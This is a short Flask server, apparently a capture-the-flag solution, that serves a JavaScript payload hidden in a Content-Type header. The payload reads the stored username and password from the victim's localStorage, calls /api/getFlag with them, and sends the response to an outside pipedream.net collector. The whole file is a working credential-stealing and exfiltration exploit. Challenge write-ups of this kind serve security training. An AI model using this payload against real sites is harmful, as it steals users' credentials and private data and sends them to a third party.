from flask import Flask, Response

app = Flask(__name__)


@app.route("/")
def tickler():
    response = Response("Satoki")
    response.headers["Content-Type"] = (
        """fetch("/api/getFlag", {headers: {login: localStorage.username + ":" + localStorage.password, "content-type": "application/json"}}).then(res => res.text()).then(text => fetch("https://enqhnbwm4vjef.x.pipedream.net/?s=" + encodeURIComponent(text))); //satoki"""
    )
    return response


if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=80)
